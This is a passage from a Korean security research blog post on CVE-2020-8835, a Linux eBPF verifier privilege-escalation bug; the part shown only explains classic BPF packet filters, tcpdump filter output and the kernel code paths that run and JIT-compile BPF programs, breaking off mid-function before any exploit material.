<!DOCTYPE html>
<html lang="en">

  <head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="google-site-verification" content="soS2al0KuMZmiyPzu87KFbqGSn0K9edQ8EkWp_m35n0" />
  

  <!-- Begin Jekyll SEO tag v2.6.1 -->
<title>CVE-2020-8835 | Core-Research-Team</title>
<meta name="generator" content="Jekyll v4.0.1" />
<meta property="og:title" content="CVE-2020-8835" />
<meta name="author" content="wwwlk" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="라온화이트햇 핵심연구팀 조진호" />
<meta property="og:description" content="라온화이트햇 핵심연구팀 조진호" />
<link rel="canonical" href="http://localhost:4000/2020-05-01/CVE-2020-8835" />
<meta property="og:url" content="http://localhost:4000/2020-05-01/CVE-2020-8835" />
<meta property="og:site_name" content="Core-Research-Team" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2020-05-01T00:00:00+00:00" />
<script type="application/ld+json">
{"@type":"BlogPosting","headline":"CVE-2020-8835","dateModified":"2020-05-01T00:00:00+00:00","datePublished":"2020-05-01T00:00:00+00:00","author":{"@type":"Person","name":"wwwlk"},"url":"http://localhost:4000/2020-05-01/CVE-2020-8835","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2020-05-01/CVE-2020-8835"},"description":"라온화이트햇 핵심연구팀 조진호","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


  <!-- CSS -->
  <link rel="stylesheet" href="/assets/main.css">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Libre+Baskerville:400,400i,700">

  <!-- Favicon -->
  <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon.png">
  <link rel="apple-touch-icon" sizes="180x180" href="/assets/favicon.ico">

  <!-- RSS -->
  <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Core-Research-Team" />

  <!-- Google Analytics-->
  
 
</head>


  <body>

    <nav class="nav">
  <div class="nav-container">
    <a href="/">
      <h2 class="nav-title">RAON - Core Research Team</h2>
    </a>
    <ul>
      <li><a href="/about">About</a></li>
      <li><a href="/">Posts</a></li>
    </ul>
  </div>
</nav>


    <main>
      <div class="post"> 
   <h1 class="post-title">CVE-2020-8835</h1>
   <div class="post-line"></div>

   
      
         
            <span class="tag"><center><i>pwnable</i></center></span>
         
      
         
            <span class="tag"><center><i>Research</i></center></span>
         
      
         
            <span class="tag"><center><i>CVE</i></center></span>
         
      
   
   
   <ul>
  <li><a href="#sumary">sumary</a></li>
  <li><a href="#bpf">BPF</a></li>
  <li><a href="#ebpf">eBPF</a></li>
  <li><a href="#reference">reference</a></li>
</ul>
   
   <p>라온화이트햇 핵심연구팀 조진호</p>

<h2 id="sumary">sumary</h2>

<p>리눅스 커널의 eBPF에서 LPE가 발생한다. 이는 <code class="highlighter-rouge">kernel/bpf/verifier.c</code>에서 검증하는 과정에서 발생한다. CVE-2020-8835는 <strong>pwn2own 2020</strong>에서 <strong>$30,000</strong>를 받은 리눅스 LPE취약점이다.</p>

<h2 id="bpf">BPF</h2>

<p><strong>berckly packet filter.</strong> 패킷에 것는 필터링. eBPF가 아닌 BPF는 간단한 구조로 되어있다. eBPF와 구분하기 위해 그냥 BPF는 classic BPF로 cBPF로 부른다. 두개의 레지스터만 가지고 있다.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">sock_filter</span> <span class="p">{</span>	<span class="cm">/* Filter block */</span>
	<span class="n">__u16</span>	<span class="n">code</span><span class="p">;</span>   <span class="cm">/* Actual filter code */</span>
	<span class="n">__u8</span>	<span class="n">jt</span><span class="p">;</span>	<span class="cm">/* Jump true */</span>
	<span class="n">__u8</span>	<span class="n">jf</span><span class="p">;</span>	<span class="cm">/* Jump false */</span>
	<span class="n">__u32</span>	<span class="n">k</span><span class="p">;</span>      <span class="cm">/* Generic multiuse field */</span>
<span class="p">};</span>
</code></pre></div></div>

<p>k는 여러가지 용도로 사용되는 변수이고 <code class="highlighter-rouge">true</code>일때 뛰는 오프셋인 <code class="highlighter-rouge">jt</code>, <code class="highlighter-rouge">false</code>일때 뛰는 오프셋인 <code class="highlighter-rouge">jf</code>가 있다. 실제 사용은 이런 식으로 사용된다.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;sys/socket.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;linux/if_ether.h&gt;
</span><span class="cm">/* ... */</span>

<span class="cm">/* From the example above: tcpdump -i em1 port 22 -dd */</span>
<span class="k">struct</span> <span class="n">sock_filter</span> <span class="n">code</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
	<span class="p">{</span> <span class="mh">0x28</span><span class="p">,</span>  <span class="mi">0</span><span class="p">,</span>  <span class="mi">0</span><span class="p">,</span> <span class="mh">0x0000000c</span> <span class="p">},</span>
	<span class="p">{</span> <span class="mh">0x15</span><span class="p">,</span>  <span class="mi">0</span><span class="p">,</span>  <span class="mi">8</span><span class="p">,</span> <span class="mh">0x000086dd</span> <span class="p">},</span>
	<span class="p">{</span> <span class="mh">0x30</span><span class="p">,</span>  <span class="mi">0</span><span class="p">,</span>  <span class="mi">0</span><span class="p">,</span> <span class="mh">0x00000014</span> <span class="p">},</span>
	<span class="p">{</span> <span class="mh">0x15</span><span class="p">,</span>  <span class="mi">2</span><span class="p">,</span>  <span class="mi">0</span><span class="p">,</span> <span class="mh">0x00000084</span> <span class="p">},</span>
	<span class="p">{</span> <span class="mh">0x15</span><span class="p">,</span>  <span class="mi">1</span><span class="p">,</span>  <span class="mi">0</span><span class="p">,</span> <span class="mh">0x00000006</span> <span class="p">},</span>
	<span class="p">{</span> <span class="mh">0x15</span><span class="p">,</span>  <span class="mi">0</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mh">0x00000011</span> <span class="p">},</span>
	<span class="p">{</span> <span class="mh">0x28</span><span class="p">,</span>  <span class="mi">0</span><span class="p">,</span>  <span class="mi">0</span><span class="p">,</span> <span class="mh">0x00000036</span> <span class="p">},</span>
	<span class="p">{</span> <span class="mh">0x15</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span>  <span class="mi">0</span><span class="p">,</span> <span class="mh">0x00000016</span> <span class="p">},</span>
	<span class="p">{</span> <span class="mh">0x28</span><span class="p">,</span>  <span class="mi">0</span><span class="p">,</span>  <span class="mi">0</span><span class="p">,</span> <span class="mh">0x00000038</span> <span class="p">},</span>
	<span class="p">{</span> <span class="mh">0x15</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mh">0x00000016</span> <span class="p">},</span>
	<span class="p">{</span> <span class="mh">0x15</span><span class="p">,</span>  <span class="mi">0</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mh">0x00000800</span> <span class="p">},</span>
	<span class="p">{</span> <span class="mh">0x30</span><span class="p">,</span>  <span class="mi">0</span><span class="p">,</span>  <span class="mi">0</span><span class="p">,</span> <span class="mh">0x00000017</span> <span class="p">},</span>
	<span class="p">{</span> <span class="mh">0x15</span><span class="p">,</span>  <span class="mi">2</span><span class="p">,</span>  <span class="mi">0</span><span class="p">,</span> <span class="mh">0x00000084</span> <span class="p">},</span>
	<span class="p">{</span> <span class="mh">0x15</span><span class="p">,</span>  <span class="mi">1</span><span class="p">,</span>  <span class="mi">0</span><span class="p">,</span> <span class="mh">0x00000006</span> <span class="p">},</span>
	<span class="p">{</span> <span class="mh">0x15</span><span class="p">,</span>  <span class="mi">0</span><span class="p">,</span>  <span class="mi">8</span><span class="p">,</span> <span class="mh">0x00000011</span> <span class="p">},</span>
	<span class="p">{</span> <span class="mh">0x28</span><span class="p">,</span>  <span class="mi">0</span><span class="p">,</span>  <span class="mi">0</span><span class="p">,</span> <span class="mh">0x00000014</span> <span class="p">},</span>
	<span class="p">{</span> <span class="mh">0x45</span><span class="p">,</span>  <span class="mi">6</span><span class="p">,</span>  <span class="mi">0</span><span class="p">,</span> <span class="mh">0x00001fff</span> <span class="p">},</span>
	<span class="p">{</span> <span class="mh">0xb1</span><span class="p">,</span>  <span class="mi">0</span><span class="p">,</span>  <span class="mi">0</span><span class="p">,</span> <span class="mh">0x0000000e</span> <span class="p">},</span>
	<span class="p">{</span> <span class="mh">0x48</span><span class="p">,</span>  <span class="mi">0</span><span class="p">,</span>  <span class="mi">0</span><span class="p">,</span> <span class="mh">0x0000000e</span> <span class="p">},</span>
	<span class="p">{</span> <span class="mh">0x15</span><span class="p">,</span>  <span class="mi">2</span><span class="p">,</span>  <span class="mi">0</span><span class="p">,</span> <span class="mh">0x00000016</span> <span class="p">},</span>
	<span class="p">{</span> <span class="mh">0x48</span><span class="p">,</span>  <span class="mi">0</span><span class="p">,</span>  <span class="mi">0</span><span class="p">,</span> <span class="mh">0x00000010</span> <span class="p">},</span>
	<span class="p">{</span> <span class="mh">0x15</span><span class="p">,</span>  <span class="mi">0</span><span class="p">,</span>  <span class="mi">1</span><span class="p">,</span> <span class="mh">0x00000016</span> <span class="p">},</span>
	<span class="p">{</span> <span class="mh">0x06</span><span class="p">,</span>  <span class="mi">0</span><span class="p">,</span>  <span class="mi">0</span><span class="p">,</span> <span class="mh">0x0000ffff</span> <span class="p">},</span>
	<span class="p">{</span> <span class="mh">0x06</span><span class="p">,</span>  <span class="mi">0</span><span class="p">,</span>  <span class="mi">0</span><span class="p">,</span> <span class="mh">0x00000000</span> <span class="p">},</span>
<span class="p">};</span>

<span class="k">struct</span> <span class="n">sock_fprog</span> <span class="n">bpf</span> <span class="o">=</span> <span class="p">{</span>
	<span class="p">.</span><span class="n">len</span> <span class="o">=</span> <span class="n">ARRAY_SIZE</span><span class="p">(</span><span class="n">code</span><span class="p">),</span>
	<span class="p">.</span><span class="n">filter</span> <span class="o">=</span> <span class="n">code</span><span class="p">,</span>
<span class="p">};</span>

<span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">PF_PACKET</span><span class="p">,</span> <span class="n">SOCK_RAW</span><span class="p">,</span> <span class="n">htons</span><span class="p">(</span><span class="n">ETH_P_ALL</span><span class="p">));</span>
<span class="k">if</span> <span class="p">(</span><span class="n">sock</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
	<span class="cm">/* ... bail out ... */</span>

<span class="n">ret</span> <span class="o">=</span> <span class="n">setsockopt</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">SO_ATTACH_FILTER</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bpf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">bpf</span><span class="p">));</span>
<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
	<span class="cm">/* ... bail out ... */</span>

<span class="n">close</span><span class="p">(</span><span class="n">sock</span><span class="p">);</span>
</code></pre></div></div>

<p><code class="highlighter-rouge">seccomp</code>걸린 바이너리를 자주 봤다면 <code class="highlighter-rouge">seccomp</code>에서 <code class="highlighter-rouge">syscall</code>필터링 주는 방식과 똑같은 것을 알 수 있다. tcpdump를 이용하면 어떤제약조건을 어떻게 검사하는지, 코드들을 자세히 볼 수 있다.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">임</span> <span class="o">~/</span><span class="n">Workspace</span> <span class="n">sudo</span> <span class="n">tcpdump</span> <span class="o">-</span><span class="n">d</span> <span class="n">src</span> <span class="mi">1</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span> 
<span class="p">(</span><span class="mo">000</span><span class="p">)</span> <span class="n">ldh</span>      <span class="p">[</span><span class="mi">12</span><span class="p">]</span>
<span class="p">(</span><span class="mo">001</span><span class="p">)</span> <span class="n">jeq</span>      <span class="err">#</span><span class="mh">0x800</span>           <span class="n">jt</span> <span class="mi">2</span>	<span class="n">jf</span> <span class="mi">4</span>
<span class="p">(</span><span class="mo">002</span><span class="p">)</span> <span class="n">ld</span>       <span class="p">[</span><span class="mi">26</span><span class="p">]</span>
<span class="p">(</span><span class="mo">003</span><span class="p">)</span> <span class="n">jeq</span>      <span class="err">#</span><span class="mh">0x1010101</span>       <span class="n">jt</span> <span class="mi">8</span>	<span class="n">jf</span> <span class="mi">9</span>
<span class="p">(</span><span class="mo">004</span><span class="p">)</span> <span class="n">jeq</span>      <span class="err">#</span><span class="mh">0x806</span>           <span class="n">jt</span> <span class="mi">6</span>	<span class="n">jf</span> <span class="mi">5</span>
<span class="p">(</span><span class="mo">005</span><span class="p">)</span> <span class="n">jeq</span>      <span class="err">#</span><span class="mh">0x8035</span>          <span class="n">jt</span> <span class="mi">6</span>	<span class="n">jf</span> <span class="mi">9</span>
<span class="p">(</span><span class="mo">006</span><span class="p">)</span> <span class="n">ld</span>       <span class="p">[</span><span class="mi">28</span><span class="p">]</span>
<span class="p">(</span><span class="mo">007</span><span class="p">)</span> <span class="n">jeq</span>      <span class="err">#</span><span class="mh">0x1010101</span>       <span class="n">jt</span> <span class="mi">8</span>	<span class="n">jf</span> <span class="mi">9</span>
<span class="p">(</span><span class="mo">00</span><span class="mi">8</span><span class="p">)</span> <span class="n">ret</span>      <span class="err">#</span><span class="mi">262144</span>
<span class="p">(</span><span class="mo">00</span><span class="mi">9</span><span class="p">)</span> <span class="n">ret</span>      <span class="err">#</span><span class="mi">0</span>
</code></pre></div></div>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">임</span> <span class="o">~/</span><span class="n">Workspace</span> <span class="n">sudo</span> <span class="n">tcpdump</span> <span class="o">-</span><span class="n">dd</span> <span class="n">src</span> <span class="mi">1</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span>
<span class="p">{</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x0000000c</span> <span class="p">},</span>
<span class="p">{</span> <span class="mh">0x15</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mh">0x00000800</span> <span class="p">},</span>
<span class="p">{</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x0000001a</span> <span class="p">},</span>
<span class="p">{</span> <span class="mh">0x15</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mh">0x01010101</span> <span class="p">},</span>
<span class="p">{</span> <span class="mh">0x15</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x00000806</span> <span class="p">},</span>
<span class="p">{</span> <span class="mh">0x15</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mh">0x00008035</span> <span class="p">},</span>
<span class="p">{</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x0000001c</span> <span class="p">},</span>
<span class="p">{</span> <span class="mh">0x15</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x01010101</span> <span class="p">},</span>
<span class="p">{</span> <span class="mh">0x6</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x00040000</span> <span class="p">},</span>
<span class="p">{</span> <span class="mh">0x6</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x00000000</span> <span class="p">},</span>
</code></pre></div></div>

<p>위코드들이 들어가는 커널 코드는 <code class="highlighter-rouge">net/packet/af_packet.c</code>에서 확인할 수 있다.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">int</span> <span class="nf">packet_rcv</span><span class="p">(</span><span class="k">struct</span> <span class="n">sk_buff</span> <span class="o">*</span><span class="n">skb</span><span class="p">,</span> <span class="k">struct</span> <span class="n">net_device</span> <span class="o">*</span><span class="n">dev</span><span class="p">,</span>
		      <span class="k">struct</span> <span class="n">packet_type</span> <span class="o">*</span><span class="n">pt</span><span class="p">,</span> <span class="k">struct</span> <span class="n">net_device</span> <span class="o">*</span><span class="n">orig_dev</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">struct</span> <span class="n">sock</span> <span class="o">*</span><span class="n">sk</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">sockaddr_ll</span> <span class="o">*</span><span class="n">sll</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">packet_sock</span> <span class="o">*</span><span class="n">po</span><span class="p">;</span>
	<span class="n">u8</span> <span class="o">*</span><span class="n">skb_head</span> <span class="o">=</span> <span class="n">skb</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">;</span>
	<span class="kt">int</span> <span class="n">skb_len</span> <span class="o">=</span> <span class="n">skb</span><span class="o">-&gt;</span><span class="n">len</span><span class="p">;</span>
	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">snaplen</span><span class="p">,</span> <span class="n">res</span><span class="p">;</span>
	<span class="n">bool</span> <span class="n">is_drop_n_account</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">skb</span><span class="o">-&gt;</span><span class="n">pkt_type</span> <span class="o">==</span> <span class="n">PACKET_LOOPBACK</span><span class="p">)</span>
		<span class="k">goto</span> <span class="n">drop</span><span class="p">;</span>

	<span class="n">sk</span> <span class="o">=</span> <span class="n">pt</span><span class="o">-&gt;</span><span class="n">af_packet_priv</span><span class="p">;</span>
	<span class="n">po</span> <span class="o">=</span> <span class="n">pkt_sk</span><span class="p">(</span><span class="n">sk</span><span class="p">);</span>

	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">net_eq</span><span class="p">(</span><span class="n">dev_net</span><span class="p">(</span><span class="n">dev</span><span class="p">),</span> <span class="n">sock_net</span><span class="p">(</span><span class="n">sk</span><span class="p">)))</span>
		<span class="k">goto</span> <span class="n">drop</span><span class="p">;</span>

	<span class="n">skb</span><span class="o">-&gt;</span><span class="n">dev</span> <span class="o">=</span> <span class="n">dev</span><span class="p">;</span>

	<span class="p">...</span>

	<span class="n">res</span> <span class="o">=</span> <span class="n">run_filter</span><span class="p">(</span><span class="n">skb</span><span class="p">,</span> <span class="n">sk</span><span class="p">,</span> <span class="n">snaplen</span><span class="p">);</span>
</code></pre></div></div>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">run_filter</span><span class="p">(</span><span class="k">struct</span> <span class="n">sk_buff</span> <span class="o">*</span><span class="n">skb</span><span class="p">,</span>
			       <span class="k">const</span> <span class="k">struct</span> <span class="n">sock</span> <span class="o">*</span><span class="n">sk</span><span class="p">,</span>
			       <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">res</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">struct</span> <span class="n">sk_filter</span> <span class="o">*</span><span class="n">filter</span><span class="p">;</span>

	<span class="n">rcu_read_lock</span><span class="p">();</span>
	<span class="n">filter</span> <span class="o">=</span> <span class="n">rcu_dereference</span><span class="p">(</span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_filter</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">filter</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
		<span class="n">res</span> <span class="o">=</span> <span class="n">bpf_prog_run_clear_cb</span><span class="p">(</span><span class="n">filter</span><span class="o">-&gt;</span><span class="n">prog</span><span class="p">,</span> <span class="n">skb</span><span class="p">);</span>
	<span class="n">rcu_read_unlock</span><span class="p">();</span>

	<span class="k">return</span> <span class="n">res</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kr">inline</span> <span class="n">u32</span> <span class="nf">bpf_prog_run_clear_cb</span><span class="p">(</span><span class="k">const</span> <span class="k">struct</span> <span class="n">bpf_prog</span> <span class="o">*</span><span class="n">prog</span><span class="p">,</span>
					<span class="k">struct</span> <span class="n">sk_buff</span> <span class="o">*</span><span class="n">skb</span><span class="p">)</span>
<span class="p">{</span>
	<span class="n">u8</span> <span class="o">*</span><span class="n">cb_data</span> <span class="o">=</span> <span class="n">bpf_skb_cb</span><span class="p">(</span><span class="n">skb</span><span class="p">);</span>
	<span class="n">u32</span> <span class="n">res</span><span class="p">;</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="n">prog</span><span class="o">-&gt;</span><span class="n">cb_access</span><span class="p">))</span>
		<span class="n">memset</span><span class="p">(</span><span class="n">cb_data</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">BPF_SKB_CB_LEN</span><span class="p">);</span>

	<span class="n">preempt_disable</span><span class="p">();</span>
	<span class="n">res</span> <span class="o">=</span> <span class="n">BPF_PROG_RUN</span><span class="p">(</span><span class="n">prog</span><span class="p">,</span> <span class="n">skb</span><span class="p">);</span>
	<span class="n">preempt_enable</span><span class="p">();</span>
	<span class="k">return</span> <span class="n">res</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define BPF_PROG_RUN(prog, ctx)	({				\
	u32 ret;						\
	cant_sleep();						\
	if (static_branch_unlikely(&amp;bpf_stats_enabled_key)) {	\
		struct bpf_prog_stats *stats;			\
		u64 start = sched_clock();			\
		ret = (*(prog)-&gt;bpf_func)(ctx, (prog)-&gt;insnsi);	\
		stats = this_cpu_ptr(prog-&gt;aux-&gt;stats);		\
		u64_stats_update_begin(&amp;stats-&gt;syncp);		\
		stats-&gt;cnt++;					\
		stats-&gt;nsecs += sched_clock() - start;		\
		u64_stats_update_end(&amp;stats-&gt;syncp);		\
	} else {						\
		ret = (*(prog)-&gt;bpf_func)(ctx, (prog)-&gt;insnsi);	\
	}							\
	ret; })
</span></code></pre></div></div>

<p><code class="highlighter-rouge">ret = (*(prog)-&gt;bpf_func)(ctx, (prog)-&gt;insnsi);</code>로 실행한다. <code class="highlighter-rouge">prog</code>의 구조체</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">bpf_prog</span> <span class="p">{</span>
	<span class="n">u16</span>			<span class="n">pages</span><span class="p">;</span>		<span class="cm">/* Number of allocated pages */</span>
	<span class="n">u16</span>			<span class="n">jited</span><span class="o">:</span><span class="mi">1</span><span class="p">,</span>	<span class="cm">/* Is our filter JIT'ed? */</span>
				<span class="nl">jit_requested:</span><span class="mi">1</span><span class="p">,</span><span class="cm">/* archs need to JIT the prog */</span>
				<span class="nl">gpl_compatible:</span><span class="mi">1</span><span class="p">,</span> <span class="cm">/* Is filter GPL compatible? */</span>
				<span class="nl">cb_access:</span><span class="mi">1</span><span class="p">,</span>	<span class="cm">/* Is control block accessed? */</span>
				<span class="nl">dst_needed:</span><span class="mi">1</span><span class="p">,</span>	<span class="cm">/* Do we need dst entry? */</span>
				<span class="nl">blinded:</span><span class="mi">1</span><span class="p">,</span>	<span class="cm">/* Was blinded */</span>
				<span class="nl">is_func:</span><span class="mi">1</span><span class="p">,</span>	<span class="cm">/* program is a bpf function */</span>
				<span class="nl">kprobe_override:</span><span class="mi">1</span><span class="p">,</span> <span class="cm">/* Do we override a kprobe? */</span>
				<span class="nl">has_callchain_buf:</span><span class="mi">1</span><span class="p">,</span> <span class="cm">/* callchain buffer allocated? */</span>
				<span class="nl">enforce_expected_attach_type:</span><span class="mi">1</span><span class="p">;</span> <span class="cm">/* Enforce expected_attach_type checking at attach time */</span>
	<span class="k">enum</span> <span class="n">bpf_prog_type</span>	<span class="n">type</span><span class="p">;</span>		<span class="cm">/* Type of BPF program */</span>
	<span class="k">enum</span> <span class="n">bpf_attach_type</span>	<span class="n">expected_attach_type</span><span class="p">;</span> <span class="cm">/* For some prog types */</span>
	<span class="n">u32</span>			<span class="n">len</span><span class="p">;</span>		<span class="cm">/* Number of filter blocks */</span>
	<span class="n">u32</span>			<span class="n">jited_len</span><span class="p">;</span>	<span class="cm">/* Size of jited insns in bytes */</span>
	<span class="n">u8</span>			<span class="n">tag</span><span class="p">[</span><span class="n">BPF_TAG_SIZE</span><span class="p">];</span>
	<span class="k">struct</span> <span class="n">bpf_prog_aux</span>	<span class="o">*</span><span class="n">aux</span><span class="p">;</span>		<span class="cm">/* Auxiliary fields */</span>
	<span class="k">struct</span> <span class="n">sock_fprog_kern</span>	<span class="o">*</span><span class="n">orig_prog</span><span class="p">;</span>	<span class="cm">/* Original BPF program */</span>
	<span class="kt">unsigned</span> <span class="kt">int</span>		<span class="p">(</span><span class="o">*</span><span class="n">bpf_func</span><span class="p">)(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">ctx</span><span class="p">,</span>
					    <span class="k">const</span> <span class="k">struct</span> <span class="n">bpf_insn</span> <span class="o">*</span><span class="n">insn</span><span class="p">);</span>
	<span class="cm">/* Instructions for interpreter */</span>
	<span class="k">union</span> <span class="p">{</span>
		<span class="k">struct</span> <span class="n">sock_filter</span>	<span class="n">insns</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
		<span class="k">struct</span> <span class="n">bpf_insn</span>		<span class="n">insnsi</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
	<span class="p">};</span>
<span class="p">};</span>
</code></pre></div></div>

<p>바이트 코드들은 JIT컴파일 되어 세팅하게 된다. <code class="highlighter-rouge">/arch/x86/net/bpf_jit_comp32.c</code></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">bpf_prog</span> <span class="o">*</span><span class="nf">bpf_int_jit_compile</span><span class="p">(</span><span class="k">struct</span> <span class="n">bpf_prog</span> <span class="o">*</span><span class="n">prog</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">struct</span> <span class="n">bpf_binary_header</span> <span class="o">*</span><span class="n">header</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">bpf_prog</span> <span class="o">*</span><span class="n">tmp</span><span class="p">,</span> <span class="o">*</span><span class="n">orig_prog</span> <span class="o">=</span> <span class="n">prog</span><span class="p">;</span>
	<span class="kt">int</span> <span class="n">proglen</span><span class="p">,</span> <span class="n">oldproglen</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">jit_context</span> <span class="n">ctx</span> <span class="o">=</span> <span class="p">{};</span>
	<span class="n">bool</span> <span class="n">tmp_blinded</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
	<span class="n">u8</span> <span class="o">*</span><span class="n">image</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="kt">int</span> <span class="o">*</span><span class="n">addrs</span><span class="p">;</span>
	<span class="kt">int</span> <span class="n">pass</span><span class="p">;</span>
	<span class="kt">int</span> <span class="n">i</span><span class="p">;</span>

	<span class="p">...</span>

	<span class="n">addrs</span> <span class="o">=</span> <span class="n">kmalloc_array</span><span class="p">(</span><span class="n">prog</span><span class="o">-&gt;</span><span class="n">len</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">addrs</span><span class="p">),</span> <span class="n">GFP_KERNEL</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">addrs</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">prog</span> <span class="o">=</span> <span class="n">orig_prog</span><span class="p">;</span>
		<span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="p">...</span>

	<span class="cm">/*
	 * JITed image shrinks with every pass and the loop iterates
	 * until the image stops shrinking. Very large BPF programs
	 * may converge on the last pass. In such case do one more
	 * pass to emit the final image.
	 */</span>
	<span class="k">for</span> <span class="p">(</span><span class="n">pass</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">pass</span> <span class="o">&lt;</span> <span class="mi">20</span> <span class="o">||</span> <span class="n">image</span><span class="p">;</span> <span class="n">pass</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">proglen</span> <span class="o">=</span> <span class="n">do_jit</span><span class="p">(</span><span class="n">prog</span><span class="p">,</span> <span class="n">addrs</span><span class="p">,</span> <span class="n">image</span><span class="p">,</span> <span class="n">oldproglen</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ctx</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">proglen</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>

		<span class="p">...</span>

		<span class="n">oldproglen</span> <span class="o">=</span> <span class="n">proglen</span><span class="p">;</span>
		<span class="n">cond_resched</span><span class="p">();</span>
	<span class="p">}</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">bpf_jit_enable</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span>
